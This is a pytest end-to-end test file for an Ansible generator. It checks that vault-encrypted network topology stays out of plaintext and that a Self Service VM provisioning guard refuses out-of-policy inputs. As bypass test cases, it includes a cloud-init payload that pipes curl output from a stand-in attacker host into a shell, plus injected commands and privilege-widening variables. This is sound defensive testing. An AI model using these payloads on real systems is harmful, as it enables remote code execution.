"""Bootstrap lifecycle with encrypted infrastructure topology, end to end and local.

Runs the real generator (``bootstrap_controller`` with ``generate_env_vars``,
``generate_playbooks`` and ``generate_aap_configs``; no AAP, no OpenShift, no Git
remote) against a synthetic preflight export with vault encryption on, then checks
what a Git push and the two execution paths would see:

* nothing internal is readable in the generated tree (group_vars, playbooks, configs,
  job template surveys), and the vault files are ciphertext that still holds it
* a generated playbook, started the way a Controller job template starts it (survey
  answers blank, vault password supplied, ``vars_files`` from the repository), resolves
  its gateway and DNS defaults from the encrypted environment configuration
* the real ``load_controller_configs.yml`` loads the generated Controller configs and
  every reference resolves
* the generated pre-push gate accepts the generated repository and refuses plaintext
  topology in ``group_vars`` or ``configs``
* a second Bootstrap run converges: no plaintext appears and the references stay

It does not launch a job on a real Controller; that needs a live AAP.

Every hostname, address and password is invented.
"""
from __future__ import annotations

import contextlib
import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[3]
FIXTURE = Path(__file__).parent / "data" / "topology-lifecycle-preflight.fixture.json"
TOPOLOGY = ROOT / "roles/bootstrap_generate_env_vars/files/ado_topology.py"
DEPENDENCIES = ROOT / ".ansible" / "collections"
VAULT_PASSWORD = "fake-e2e-vault-password"
ENV = "molecule"

HAVE_ANSIBLE = shutil.which("ansible-playbook") is not None and shutil.which("ansible-vault") is not None
pytestmark = pytest.mark.skipif(
    not HAVE_ANSIBLE or not DEPENDENCIES.is_dir(),
    reason="needs ansible-playbook, ansible-vault and the collection dependencies in .ansible/collections",
)

ZONE = "lab-a.corp.invalid-zone.io"
MARKERS = (ZONE, "10.77.")
GATEWAY = "10.77.0.1"
DNS = ["10.77.0.53", "10.77.0.54"]
API_HOST = f"https://api.ocp.{ZONE}:6443"
GIT_URL = f"https://git.apps.{ZONE}/redhat-lab/bootstrap-sample.git"
SATELLITE = f"satellite.{ZONE}"

CONVERGE = """---
- name: Generate bootstrap content with topology encryption on
  hosts: localhost
  gather_facts: false
  connection: local
  vars:
    env: molecule
    preflight_json: "{{ playbook_dir }}/ado-preflight-all.json"
    generate_env_vars: true
    generate_env_vars_force: true
    generate_playbooks: true
    generate_aap_configs: true
    apply_aap_configs: false
    generate_env_vars_encrypt_vault_files: true
    bootstrap_generate_env_vars_encrypt_vault_files: true
    bootstrap_generate_env_vars_vault_password_file: "{{ lookup('ansible.builtin.env', 'ANSIBLE_VAULT_PASSWORD_FILE') }}"
    generate_env_vars_encrypt_vault: false
    generate_env_vars_vault_encrypt: false
    generate_env_vars_prompt_encrypt_vault_files:
      user_input: "y"
    generate_env_vars_prompt_encrypt_vault:
      user_input: "y"
    generate_playbook_repo_pause_for_push: false
    generate_playbook_repo_git_push: false
    generate_playbook_repo_git_commit: false
  pre_tasks:
    - name: Keep previous output out of this run
      ansible.builtin.file:
        path: "{{ playbook_dir }}/{{ item }}"
        state: absent
      loop: [playbooks, configs, group_vars, inventory, collections, templates, ado-preflight-all.json]
    - name: Write the synthetic preflight JSON
      ansible.builtin.copy:
        src: ado-preflight-all.fixture.json
        dest: "{{ preflight_json }}"
        mode: "0600"
  roles:
    - role: infra.automation_development_office.bootstrap_controller
"""


class Lifecycle:
    def __init__(self, base: Path):
        self.base = base
        self.repo = base / "repo"
        self.outside = base / "outside"
        self.password_file = self.outside / "vault-pass"
        self.env_dir = self.repo / "group_vars" / "all" / ENV

    def environment(self) -> dict:
        collections = self.base / "cols"
        env = {k: v for k, v in os.environ.items() if not k.startswith("ANSIBLE_")}
        env.update(
            ANSIBLE_COLLECTIONS_PATH=f"{collections}:{DEPENDENCIES}",
            ANSIBLE_HOST_KEY_CHECKING="false",
            ANSIBLE_FORCE_COLOR="false",
            ANSIBLE_LOCALHOST_WARNING="false",
            ANSIBLE_VAULT_PASSWORD_FILE=str(self.password_file),
            ANSIBLE_HOME=str(self.base / "ansible-home"),
            PYTHONDONTWRITEBYTECODE="1",
        )
        return env

    def run(self, playbook: Path, *extra: str, cwd: Path | None = None, check: bool = True):
        result = subprocess.run(
            ["ansible-playbook", str(playbook), "-i", "localhost,", "-c", "local",
             "--vault-password-file", str(self.password_file), *extra],
            cwd=cwd or self.repo, env=self.environment(), capture_output=True, text=True, check=False,
        )
        if check and result.returncode != 0:
            tail = "\n".join((result.stdout + result.stderr).splitlines()[-40:])
            raise AssertionError(f"ansible-playbook {playbook.name} failed:\n{tail}")
        return result

    def generate(self):
        self.run(self.repo / "converge.yml")

    def plaintext_files(self):
        """Generated files that Git would receive as text."""
        skip_names = {"converge.yml", "ado-preflight-all.json", "ado-preflight-all.fixture.json"}
        for path in sorted(self.repo.rglob("*")):
            if path.is_file() and path.name not in skip_names and not path.name.startswith("_"):
                data = path.read_bytes()
                if not data.startswith(b"$ANSIBLE_VAULT"):
                    yield path, data


@pytest.fixture(scope="module")
def lifecycle(tmp_path_factory):
    base = tmp_path_factory.mktemp("topology-lifecycle")
    state = Lifecycle(base)
    state.repo.mkdir()
    state.outside.mkdir()
    state.password_file.write_text(VAULT_PASSWORD + "\n")
    state.password_file.chmod(0o600)
    (base / "cols" / "ansible_collections" / "infra").mkdir(parents=True)
    (base / "cols" / "ansible_collections" / "infra" / "automation_development_office").symlink_to(ROOT)
    shutil.copy(FIXTURE, state.repo / "ado-preflight-all.fixture.json")
    (state.repo / "converge.yml").write_text(CONVERGE)
    state.generate()
    return state


def test_nothing_internal_is_readable_in_the_generated_repository(lifecycle):
    leaks = [
        str(path.relative_to(lifecycle.repo))
        for path, data in lifecycle.plaintext_files()
        if any(marker.encode() in data for marker in MARKERS)
    ]
    assert leaks == []


def test_audits_report_no_plaintext_topology(lifecycle):
    env = {**os.environ, "ANSIBLE_VAULT_PASSWORD_FILE": str(lifecycle.password_file)}
    for args in (["audit", "--env-dir", str(lifecycle.env_dir)], ["audit-configs", "--configs-dir", str(lifecycle.repo / "configs")]):
        done = subprocess.run([sys.executable, str(TOPOLOGY), *args], capture_output=True, text=True, env=env, check=False)
        assert done.returncode == 0, done.stdout + done.stderr
        assert re.search(r"plaintext topology values(?: in configs)?: 0\b", done.stdout), done.stdout
        assert not any(marker in done.stdout + done.stderr for marker in MARKERS)


def test_vault_files_are_ciphertext_and_still_hold_the_topology(lifecycle):
    for name in ("vault_openshift.yml", "aap_vault.yml"):
        assert (lifecycle.env_dir / name).read_bytes().startswith(b"$ANSIBLE_VAULT"), name
    viewed = subprocess.run(
        ["ansible-vault", "view", str(lifecycle.env_dir / "vault_openshift.yml"), "--vault-password-file", str(lifecycle.password_file)],
        capture_output=True, text=True, check=True,
    ).stdout
    assert API_HOST in viewed
    config_vault = subprocess.run(
        ["ansible-vault", "view", str(lifecycle.env_dir / "aap_vault.yml"), "--vault-password-file", str(lifecycle.password_file)],
        capture_output=True, text=True, check=True,
    ).stdout
    assert "vault_topology_cfg_" in config_vault and SATELLITE in config_vault


def test_existing_variable_names_are_kept_and_hold_references(lifecycle):
    infra = yaml.safe_load((lifecycle.env_dir / "infra_config_vars.yml").read_text())
    for name in ("api_host", "apps_domain", "domain"):
        assert str(infra[name]).startswith("{{ vault_topology_infra_config_vars__"), name
    virt = yaml.safe_load((lifecycle.env_dir / "vars_openshift_virt.yml").read_text())
    assert str(virt["provision_openshift_virt_gateway"]).startswith("{{ vault_topology_")
    assert str(virt["openshift_virt_ip_range"]).startswith("{{ vault_topology_")
    assert virt["provision_openshift_virt_prefix_length"] == 24  # sizing stays readable


def test_job_template_survey_defaults_carry_no_topology(lifecycle):
    path = lifecycle.repo / "configs" / "job_templates" / "ado-provision-openshift-virt-vm-bootstrap.jt.yml"
    spec = yaml.safe_load(path.read_text())["controller_templates"][0]["survey_spec"]["spec"]
    by_variable = {q["variable"]: q for q in spec}
    for variable in ("provision_openshift_virt_gateway", "provision_openshift_virt_dns_servers", "provision_openshift_virt_static_ip"):
        assert by_variable[variable]["default"] in ("", None), variable
    assert "10.77" not in json.dumps(spec)
    assert by_variable["provision_openshift_virt_prefix_length"]["default"] == 24


def test_no_generated_job_template_or_workflow_holds_topology(lifecycle):
    env = {**os.environ}
    for sub in ("job_templates", "workflows"):
        files = list((lifecycle.repo / "configs" / sub).glob("*.yml"))
        assert files, sub
    done = subprocess.run(
        [sys.executable, str(TOPOLOGY), "audit-configs", "--configs-dir", str(lifecycle.repo / "configs")],
        capture_output=True, text=True, env=env, check=False,
    )
    assert done.returncode == 0, done.stdout


def test_standalone_playbook_resolves_blank_survey_defaults_from_encrypted_config(lifecycle):
    """A Controller launch passes blank survey answers as extra vars; the playbook must still resolve the defaults."""
    source = lifecycle.repo / "playbooks" / "provision" / "ado-provision-openshift-virt-vm-bootstrap.yml"
    play = yaml.safe_load(source.read_text())[0]
    play.pop("roles", None)
    play["tasks"] = [
        {"ansible.builtin.assert": {"that": [
            f"api_host == {json.dumps(API_HOST)}",
            f"virt_gateway_effective == {json.dumps(GATEWAY)}",
            f"virt_dns_servers_effective == {json.dumps(DNS)}",
            f"'gateway4: {GATEWAY}' in cloud_init_network_data",
            f"'- {DNS[0]}' in cloud_init_network_data and '- {DNS[1]}' in cloud_init_network_data",
            "'vault_topology_' not in cloud_init_network_data",
        ]}},
    ]
    derived = source.with_name("_derived_lifecycle.yml")
    derived.write_text(yaml.safe_dump([play], sort_keys=False))
    lifecycle.run(
        derived, "-e", f"env={ENV}",
        "-e", "provision_openshift_virt_gateway=", "-e", "provision_openshift_virt_dns_servers=",
        "-e", "provision_openshift_virt_static_ip=10.77.0.150",
        cwd=derived.parent,
    )


def test_controller_loads_the_generated_configs_and_every_reference_resolves(lifecycle):
    loader = lifecycle.repo / "_controller_load.yml"
    loader.write_text(yaml.safe_dump([{
        "hosts": "localhost", "gather_facts": False,
        "vars": {"env": ENV},
        "tasks": [
            {"ansible.builtin.include_vars": {"file": f"{lifecycle.env_dir}/aap_vault.yml"}, "no_log": True},
            {"ansible.builtin.find": {"paths": str(lifecycle.env_dir), "patterns": "vault_*.yml"}, "register": "vaults"},
            {"ansible.builtin.include_vars": {"file": "{{ item.path }}"}, "loop": "{{ vaults.files }}", "no_log": True},
            {"ansible.builtin.include_tasks": str(ROOT / "roles/bootstrap_controller/tasks/load_controller_configs.yml")},
            {"ansible.builtin.assert": {"that": [
                f"{json.dumps(SATELLITE)} in (controller_hosts | map(attribute='name') | list)",
                f"{json.dumps(API_HOST)} in (controller_hosts | map(attribute='name') | list)",
                "(controller_hosts | map(attribute='name') | select('search', 'vault_topology_') | list | length) == 0",
                f"controller_projects | map(attribute='scm_url') | select('equalto', {json.dumps(GIT_URL)}) | list | length > 0",
            ]}},
        ],
    }]))
    lifecycle.run(loader, cwd=lifecycle.repo)


def _publication_repo(lifecycle, tmp_path: Path) -> Path:
    repo = tmp_path / "publish"
    shutil.copytree(
        lifecycle.repo, repo,
        ignore=shutil.ignore_patterns("ado-preflight-*.json", "converge.yml", "_*.yml", ".ansible"),
    )
    for name in ("ado_credential_gate.py", "ado_topology_rules.py"):  # shipped by the generator
        assert (repo / ".githooks" / name).is_file(), name
    subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
    subprocess.run(["git", "config", "user.email", "t@example.invalid"], cwd=repo, check=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=repo, check=True)
    return repo


def _gate(repo: Path):
    subprocess.run(["git", "add", "-A", "-f"], cwd=repo, check=True)
    return subprocess.run(
        [sys.executable, str(repo / ".githooks" / "ado_credential_gate.py"), "--repo", str(repo), "--profile", "repo"],
        capture_output=True, text=True, check=False,
    )


def test_git_publication_accepts_the_generated_repository(lifecycle, tmp_path):
    done = _gate(_publication_repo(lifecycle, tmp_path))
    assert done.returncode == 0, done.stdout + done.stderr


@pytest.mark.parametrize(
    ("relative", "reference_key"),
    [
        ("group_vars/all/molecule/infra_config_vars.yml", "api_host"),
        ("configs/controller/hosts.yml", "name"),
    ],
)
def test_git_publication_rejects_plaintext_topology_introduced_later(lifecycle, tmp_path, relative, reference_key):
    repo = _publication_repo(lifecycle, tmp_path)
    target = repo / relative
    data = yaml.safe_load(target.read_text())
    holder = data[next(iter(data))] if relative.startswith("configs") else data
    if isinstance(holder, list):
        holder[1][reference_key] = SATELLITE
    else:
        holder[reference_key] = API_HOST
    target.write_text(yaml.safe_dump(data))
    done = _gate(repo)
    assert done.returncode == 3, done.stdout + done.stderr
    assert "plaintext-topology" in done.stderr
    assert not any(marker in done.stdout + done.stderr for marker in MARKERS)


def test_a_second_bootstrap_run_converges_without_plaintext(lifecycle):
    before = yaml.safe_load((lifecycle.env_dir / "vars_openshift_virt.yml").read_text())
    lifecycle.generate()
    assert [path for path, data in lifecycle.plaintext_files() if any(m.encode() in data for m in MARKERS)] == []
    after = yaml.safe_load((lifecycle.env_dir / "vars_openshift_virt.yml").read_text())
    assert after == before
    assert (lifecycle.env_dir / "aap_vault.yml").read_bytes().startswith(b"$ANSIBLE_VAULT")
    env = {**os.environ, "ANSIBLE_VAULT_PASSWORD_FILE": str(lifecycle.password_file)}
    done = subprocess.run(
        [sys.executable, str(TOPOLOGY), "audit-configs", "--configs-dir", str(lifecycle.repo / "configs")],
        capture_output=True, text=True, env=env, check=False,
    )
    assert done.returncode == 0


# ---- Dual OpenShift Virt templates: Self Service and Advanced share one playbook ----

SS_JT = "ado-create-vm-self-service-bootstrap.jt.yml"
SELF_SERVICE_LAUNCH = {
    "env": ENV,
    "ado_vm_template_mode": "self_service",  # set by the job template, not the caller
    "state": "present",
    "provision_openshift_virt_namespace": "team-a",
    "provision_openshift_virt_vm_name": "web-01",
    "provision_openshift_virt_source_name": "rhel9",
    "provision_openshift_virt_size": "Medium",
    "provision_openshift_virt_start": "true",
}


def _run_generated_virt_playbook(lifecycle, launch, checks=None, *, quota=None, guest_memory="8Gi", raw=()):
    """Run the generated provision playbook's pre_tasks the way a job template starts it.

    The roles are dropped so nothing is created. The two read-only cluster lookups are
    replaced by fixed data so the guard and quota logic run for real without a cluster.
    """
    source = lifecycle.repo / "playbooks" / "provision" / "ado-provision-openshift-virt-vm-bootstrap.yml"
    play = yaml.safe_load(source.read_text())[0]
    play.pop("roles", None)
    pre_tasks = []
    for task in play["pre_tasks"]:
        module = next((key for key in task if key.startswith("kubernetes.core.")), None)
        if module is None:
            pre_tasks.append(task)
        elif "quota" in task["name"]:
            pre_tasks.append({"name": task["name"], "ansible.builtin.set_fact": {"ado_vm_quota": {"resources": quota or []}},
                              "when": task["when"]})
        else:
            pre_tasks.append({"name": task["name"], "ansible.builtin.set_fact": {"ado_vm_instancetype": {
                "resources": [{"spec": {"memory": {"guest": guest_memory}}}]}}, "when": task["when"]})
    play["pre_tasks"] = pre_tasks
    play["tasks"] = [{"ansible.builtin.assert": {"that": checks}}] if checks else []
    derived = source.with_name("_derived_virt_templates.yml")
    derived.write_text(yaml.safe_dump([play], sort_keys=False))
    extra = []
    for key, value in launch.items():
        extra += ["-e", f"{key}={value}"]
    for item in raw:
        extra += ["-e", item]
    return lifecycle.run(derived, *extra, cwd=derived.parent, check=False)


def _refused(result):
    return result.returncode != 0 and "Self Service refused" in result.stdout + result.stderr


def test_generated_self_service_template_offers_only_the_approved_choices(lifecycle):
    configs = lifecycle.repo / "configs" / "job_templates"
    template = yaml.safe_load((configs / SS_JT).read_text())["controller_templates"][0]
    advanced = yaml.safe_load((configs / "ado-provision-openshift-virt-vm-bootstrap.jt.yml").read_text())["controller_templates"][0]
    assert template["name"].endswith("| Create VM \u2014 Self Service")
    assert template["playbook"] == advanced["playbook"]
    assert template["ask_variables_on_launch"] is False
    assert template["extra_vars"]["ado_vm_template_mode"] == "self_service"
    by_variable = {q["variable"]: q for q in template["survey_spec"]["spec"]}
    assert by_variable["provision_openshift_virt_namespace"]["choices"] == "team-a\nteam-b"
    assert by_variable["provision_openshift_virt_source_name"]["choices"] == "rhel9\nrhel10"
    assert by_variable["provision_openshift_virt_size"]["choices"] == "Small\nMedium\nLarge"
    assert by_variable["provision_openshift_virt_size"]["default"] == "Medium"
    assert by_variable["provision_openshift_virt_namespace"]["default"] == "team-a"
    assert "{{" not in json.dumps(template["survey_spec"]), "a survey placeholder was left unfilled"


def test_generated_policy_holds_names_and_defaults_not_topology(lifecycle):
    virt = yaml.safe_load((lifecycle.env_dir / "vars_openshift_virt.yml").read_text())
    policy = virt["openshift_virt_self_service_policy"]
    assert policy["enabled"] is True
    assert [s["label"] for s in policy["sizes"]] == ["Small", "Medium", "Large"]
    assert policy["defaults"]["storage_class"] == "fixture-rbd"
    assert policy["defaults"]["cloud_user"] == "cloud-user"
    assert "10.77" not in json.dumps(policy)


def test_self_service_launch_inside_the_policy_uses_approved_values_only(lifecycle):
    result = _run_generated_virt_playbook(
        lifecycle,
        {**SELF_SERVICE_LAUNCH,
         # a caller (or an old survey) trying to widen things through the survey-era names
         "provision_openshift_virt_instance_type": "custom", "provision_openshift_virt_storage_class": "other",
         "provision_openshift_virt_cloud_user_password": "x", "provision_openshift_virt_root_password": "x",
         "provision_openshift_virt_enable_root_ssh": "true", "provision_openshift_virt_static_ip": "10.77.0.150",
         "provision_openshift_virt_preference": "rhel.10", "provision_openshift_virt_hostname": "other-host"},
        [
            "ado_vm_self_service | bool",
            "instance_type == 'u1.large'",
            "preference == 'rhel.9'",
            "storage_class == 'fixture-rbd'",
            "root_disk_size == '30Gi'",
            "network_mode == 'masquerade'",
            "source_namespace == 'openshift-virtualization-os-images'",
            "cloud_user_password == '' and root_password == ''",
            "not (enable_root_ssh | bool)",
            "'hostname: web-01' in cloud_init_user_data",
            "'ssh-ed25519 AAAA-fixture-key' in cloud_init_user_data",
            "'chpasswd' not in cloud_init_user_data and 'PermitRootLogin' not in cloud_init_user_data",
            # DHCP: no static address. Exactly the empty string, not whitespace (Ansible re-adds a
            # trailing newline to a template source that ends with one).
            "cloud_init_network_data == '' and (cloud_init_network_data | length) == 0",
            "ado_cloud_init_network_data_expected == '' and (ado_cloud_init_network_data_expected | length) == 0",
        ],
    )
    assert result.returncode == 0, result.stdout + result.stderr


def test_self_service_refuses_values_a_caller_adds_outside_the_survey(lifecycle):
    attempts = {
        "project outside the policy": ["provision_openshift_virt_namespace=kube-system"],
        "image outside the policy": ["provision_openshift_virt_source_name=custom-image"],
        "size outside the policy": ["provision_openshift_virt_size=Huge"],
        "invalid VM name": ["provision_openshift_virt_vm_name=Bad_Name"],
        "role-facing instance type": ["instance_type=u1.2xlarge"],
        "role-facing storage class": ["storage_class=fast"],
        "role-facing network mode": ["network_mode=bridge"],
        "role-facing boot image namespace": ["source_namespace=default"],
        "role-facing password": ["cloud_user_password=x"],
        "role-facing root ssh": ["enable_root_ssh=true"],
        "role-facing login user": ["ado_vm_cloud_user=root"],
        "removal": ["state=absent"],
        "replaced cloud-init": ["cloud_init_user_data=#cloud-config\\nruncmd: [id]"],
        "replaced network data": ["cloud_init_network_data=version: 2"],
    }
    launch = {k: v for k, v in SELF_SERVICE_LAUNCH.items() if k != "state"}
    failures = []
    for label, extras in attempts.items():
        launch_with_state = {**launch, "state": "present"} if label != "removal" else launch
        result = _run_generated_virt_playbook(lifecycle, launch_with_state, raw=extras)
        if not _refused(result):
            failures.append(label)
    assert failures == []


@contextlib.contextmanager
def _policy_file(lifecycle, change):
    """Rewrite the generated vars_openshift_virt.yml for one run and always put it back."""
    path = lifecycle.env_dir / "vars_openshift_virt.yml"
    original = path.read_bytes()
    try:
        document = yaml.safe_load(original)
        change(document)
        path.write_text(yaml.safe_dump(document, sort_keys=False))
        yield
    finally:
        path.write_bytes(original)


def test_self_service_refuses_when_the_policy_is_missing_or_disabled(lifecycle):
    """The guard reads the policy from the project file, so the file is what disables Self Service."""

    def disable(document):
        document["openshift_virt_self_service_policy"]["enabled"] = False

    def empty(document):
        document["openshift_virt_self_service_policy"] = {}

    def missing(document):
        del document["openshift_virt_self_service_policy"]

    for change in (disable, empty, missing):
        with _policy_file(lifecycle, change):
            result = _run_generated_virt_playbook(lifecycle, SELF_SERVICE_LAUNCH)
        assert _refused(result), change.__name__
        assert "not configured" in result.stdout + result.stderr, change.__name__
    # and the file is back as generated: the approved launch works again
    assert _run_generated_virt_playbook(lifecycle, SELF_SERVICE_LAUNCH).returncode == 0


def test_self_service_refuses_a_policy_with_template_expressions(lifecycle):
    def template(document):
        document["openshift_virt_self_service_policy"]["defaults"]["storage_class"] = "{{ some_variable }}"

    with _policy_file(lifecycle, template):
        result = _run_generated_virt_playbook(lifecycle, SELF_SERVICE_LAUNCH)
    assert _refused(result)
    assert "template expressions" in result.stdout + result.stderr


def test_self_service_refuses_a_size_the_namespace_quota_cannot_hold(lifecycle):
    tight = [{"metadata": {"name": "team-a-compute"},
              "status": {"hard": {"requests.memory": "10Gi"}, "used": {"requests.memory": "6Gi"}}}]
    refused = _run_generated_virt_playbook(lifecycle, SELF_SERVICE_LAUNCH, quota=tight, guest_memory="8Gi")
    assert refused.returncode != 0 and "Self Service refused this size" in refused.stdout + refused.stderr
    assert "team-a-compute" in refused.stdout
    roomy = [{"metadata": {"name": "team-a-compute"},
              "status": {"hard": {"requests.memory": "64Gi"}, "used": {"requests.memory": "6Gi"}}}]
    assert _run_generated_virt_playbook(lifecycle, SELF_SERVICE_LAUNCH, quota=roomy).returncode == 0
    assert _run_generated_virt_playbook(lifecycle, SELF_SERVICE_LAUNCH, quota=[]).returncode == 0


def test_advanced_template_is_not_restricted_and_keeps_its_behaviour(lifecycle):
    """No mode set: the Advanced path resolves exactly what the survey says, including custom values."""
    result = _run_generated_virt_playbook(
        lifecycle,
        {"env": ENV, "state": "present", "provision_openshift_virt_namespace": "any-namespace",
         "provision_openshift_virt_vm_name": "Any_Name-1", "provision_openshift_virt_source_name": "custom-image",
         "provision_openshift_virt_instance_type": "custom", "provision_openshift_virt_storage_class": "fast",
         "provision_openshift_virt_hostname": "adv-host", "provision_openshift_virt_cloud_user": "ops",
         "provision_openshift_virt_cloud_user_password": "fake-pw", "provision_openshift_virt_static_ip": "10.77.0.150",
         "provision_openshift_virt_enable_root_ssh": "true", "provision_openshift_virt_preference": "rhel.10",
         "provision_openshift_virt_source_namespace": "images", "provision_openshift_virt_root_disk_size": "100Gi"},
        [
            "not (ado_vm_self_service | bool)",
            "instance_type == 'custom' and preference == 'rhel.10'",
            "storage_class == 'fast' and root_disk_size == '100Gi'",
            "source_namespace == 'images' and vm_namespace == 'any-namespace'",
            "cloud_user_password == 'fake-pw' and (enable_root_ssh | bool)",
            "'hostname: adv-host' in cloud_init_user_data and '- name: ops' in cloud_init_user_data",
            "'10.77.0.150/24' in cloud_init_network_data",
        ],
    )
    assert result.returncode == 0, result.stdout + result.stderr
    assert "Self Service refused" not in result.stdout


PERMISSIVE_POLICY = {
    "enabled": True,
    "images": [{"id": "custom-image", "label": "Custom", "preference": "rhel.10"}],
    "sizes": [{"label": "Huge", "instance_type": "u1.8xlarge"}],
    "namespaces": ["kube-system"],
    "defaults": {
        "storage_class": "fast", "network_mode": "bridge", "multus_network_name": "kube-system/x",
        "root_disk_size": "900Gi", "source_namespace": "default", "cloud_user": "root",
        "ssh_public_key": "ssh-ed25519 AAAA-attacker",
    },
}
EVIL_USER_DATA = "#cloud-config\nruncmd:\n  - curl http://attacker.invalid/x | sh\n"
OUT_OF_POLICY = {"provision_openshift_virt_namespace": "kube-system", "provision_openshift_virt_size": "Huge"}


def _json_vars(**values):
    return json.dumps(values)


def test_self_service_cannot_be_bypassed_by_replacing_what_the_guard_used_to_trust(lifecycle):
    """An extra variable beats every variable the play sets. Replace each internal one and still be refused.

    Every attempt below also asks for something outside the approved policy, so a skipped or
    weakened guard would let the run succeed.
    """
    evil_in_launch = {
        **SELF_SERVICE_LAUNCH, "provision_openshift_virt_source_name": "custom-image",
        "provision_openshift_virt_namespace": "kube-system",
    }
    attempts = {
        "switch turned off": (evil_in_launch, [_json_vars(ado_vm_self_service=False)]),
        "policy variable replaced": (evil_in_launch, [_json_vars(openshift_virt_self_service_policy=PERMISSIVE_POLICY)]),
        "internal policy replaced": (evil_in_launch, [_json_vars(ado_vm_policy=PERMISSIVE_POLICY)]),
        "internal defaults replaced": (SELF_SERVICE_LAUNCH, [_json_vars(ado_vm_defaults=PERMISSIVE_POLICY["defaults"])]),
        "internal effective values replaced": (
            SELF_SERVICE_LAUNCH,
            [_json_vars(ado_vm_effective={}), "instance_type=u1.8xlarge"],
        ),
        "cloud-init and its expected text replaced together": (
            SELF_SERVICE_LAUNCH,
            [_json_vars(cloud_init_user_data=EVIL_USER_DATA, ado_cloud_init_user_data_expected=EVIL_USER_DATA)],
        ),
        "network data and its expected text replaced together": (
            SELF_SERVICE_LAUNCH,
            [_json_vars(cloud_init_network_data="version: 2", ado_cloud_init_network_data_expected="version: 2")],
        ),
        "extra user in cloud-init and expected text": (
            SELF_SERVICE_LAUNCH,
            [_json_vars(
                ado_cloud_init_user_data_expected="#cloud-config\nhostname: web-01\nusers:\n  - name: root\n",
                cloud_init_user_data="#cloud-config\nhostname: web-01\nusers:\n  - name: root\n",
            )],
        ),
        "state absent through the namespace role only": (SELF_SERVICE_LAUNCH, ["state=absent", "vm_state=present"]),
        "other project through the namespace role": (SELF_SERVICE_LAUNCH, ["ocp_namespace_name=kube-system"]),
        "other project through the framework fact": (SELF_SERVICE_LAUNCH, ["name_space=kube-system"]),
        "mode misspelled": ({**SELF_SERVICE_LAUNCH, "ado_vm_template_mode": "Self-Service"}, []),
        "mode unknown": ({**SELF_SERVICE_LAUNCH, "ado_vm_template_mode": "selfservice"}, ["instance_type=u1.8xlarge"]),
        "everything out of policy at once": (
            {**SELF_SERVICE_LAUNCH, **OUT_OF_POLICY},
            [_json_vars(ado_vm_self_service=False, ado_vm_policy=PERMISSIVE_POLICY,
                        openshift_virt_self_service_policy=PERMISSIVE_POLICY, ado_vm_defaults=PERMISSIVE_POLICY["defaults"])],
        ),
    }
    failures = []
    for label, (launch, raw) in attempts.items():
        result = _run_generated_virt_playbook(lifecycle, launch, raw=raw)
        if not _refused(result):
            failures.append(label)
    assert failures == []


def test_a_job_template_name_that_says_self_service_keeps_the_guard_on_when_the_mode_is_overridden(lifecycle):
    """Second signal: AAP names the job template. Overriding the mode alone is not enough."""
    template = _json_vars(awx_job_template_name="ADO | Create VM \u2014 Self Service")
    overridden = {**SELF_SERVICE_LAUNCH, "ado_vm_template_mode": "advanced"}
    refused = _run_generated_virt_playbook(
        lifecycle, {**overridden, **OUT_OF_POLICY}, raw=[template, "instance_type=u1.8xlarge"]
    )
    assert _refused(refused)
    # the template name alone also selects Self Service, with no mode at all
    only_name = {k: v for k, v in SELF_SERVICE_LAUNCH.items() if k != "ado_vm_template_mode"}
    assert _refused(_run_generated_virt_playbook(lifecycle, {**only_name, **OUT_OF_POLICY}, raw=[template]))
    # an in-policy launch through that template still works, and takes the approved values
    allowed = _run_generated_virt_playbook(
        lifecycle, overridden, ["ado_vm_self_service | bool", "instance_type == 'u1.large'"], raw=[template]
    )
    assert allowed.returncode == 0, allowed.stdout + allowed.stderr
    tower = _json_vars(tower_job_template_name="ADO | Create VM \u2014 Self Service")
    assert _refused(_run_generated_virt_playbook(lifecycle, {**overridden, **OUT_OF_POLICY}, raw=[tower]))


def test_residual_limitation_the_mode_variable_is_the_only_switch_without_an_aap_job_template_name(lifecycle):
    """Documents what a playbook cannot do. This is not a feature.

    If an extra variable named ado_vm_template_mode reaches the play, and AAP does not also
    name a Self Service job template, the play treats the run as Advanced and does not guard it.
    Nothing inside one shared playbook can prevent that, because an extra variable has higher
    precedence than every variable the playbook sets. The control is outside the playbook:
    the Self Service job template must not accept launch variables (and workflow nodes must not
    pass them), and only intended users may launch it. See the ocp_virtualization README.
    """
    result = _run_generated_virt_playbook(
        lifecycle,
        {**SELF_SERVICE_LAUNCH, "ado_vm_template_mode": "advanced", **OUT_OF_POLICY},
        raw=["instance_type=u1.8xlarge"],
    )
    assert result.returncode == 0 and "Self Service refused" not in result.stdout


def test_advanced_template_dhcp_network_data_is_exactly_empty_and_static_is_unchanged(lifecycle):
    base = {"env": ENV, "state": "present", "provision_openshift_virt_namespace": "any-namespace",
            "provision_openshift_virt_vm_name": "adv-1", "provision_openshift_virt_source_name": "rhel9"}
    dhcp = _run_generated_virt_playbook(
        lifecycle, base,
        ["cloud_init_network_data == ''", "ado_cloud_init_network_data_expected == ''"],
        raw=["provision_openshift_virt_static_ip="],
    )
    assert dhcp.returncode == 0, dhcp.stdout + dhcp.stderr
    static = _run_generated_virt_playbook(
        lifecycle, {**base, "provision_openshift_virt_static_ip": "10.77.0.150"},
        [
            "cloud_init_network_data.startswith('version: 2\\n')",
            "cloud_init_network_data.endswith('\\n') and not cloud_init_network_data.endswith('\\n\\n')",
            "'10.77.0.150/24' in cloud_init_network_data",
        ],
    )
    assert static.returncode == 0, static.stdout + static.stderr
